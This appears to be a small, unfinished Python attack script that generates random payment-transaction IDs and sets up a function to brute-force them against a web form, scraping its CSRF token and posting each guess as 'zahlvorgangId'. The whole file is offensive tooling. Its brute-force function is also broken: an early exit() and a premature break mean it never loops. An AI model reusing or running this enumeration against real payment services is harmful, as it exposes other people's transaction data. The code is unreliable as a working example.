#!/usr/bin/env python3
# Rainer Christian Bjoern Herold
# Version 0.1, 10.12.2022

# Libraries
from numpy import array
from os.path import exists
from random import randint
from requests import get, post
from sys import argv
from time import sleep

# Variables
Path = "/opt/zahl_ids.txt"
url = "https://local.host"

# Arrays
Array_Temp, Text = [], []

# Functions
def Read_File(path):
     with open(path, 'r') as f:
         return f.read().splitlines()

def Generate_List():
        #################################
        # Thx to @Atreus92 for the idea #
        def Generator():
        	a,b,c,d = randint(0,9),randint(0,9),randint(0,9),randint(0,9)
        	return (f'{a}{b}{c}{d}')
        #################################

        n = 0
        while len(Array_Temp) != int(argv[1]):
                ZahlungsID = str(f'0000-{Generator()}-{Generator()}-{Generator()}-{Generator()}')
                if (ZahlungsID not in Array_Temp):
                        Array_Temp.append(str(ZahlungsID))
                        n += 1
                        print (n, end='\r'), sleep(0.001)
        else: print(n)

        if (exists(Path)): Text = Read_File(Path)
        with open(Path, 'a') as f:
                for Zahl_ID in array(Array_Temp):
                        if (Zahl_ID not in Text):
                                f.write(f'{Zahl_ID}\n')

def Brute_Target(url):
        r = get(url)
        print ("")
        exit()
        for i in array(str(r.text).splitlines()):
            if ("_csrf" in i):
               CSRF = i.split('value="')[1][:-3]
               break
        for IDs in array(Read_File(Path)):
                Data={'_csrf': CSRF,'zahlvorgangId': IDs}
                r = post(url, data=Data)
                break
        print (r)
        sleep(30)
        print (r.text)

# Main
if __name__ == '__main__':
	Generate_List()
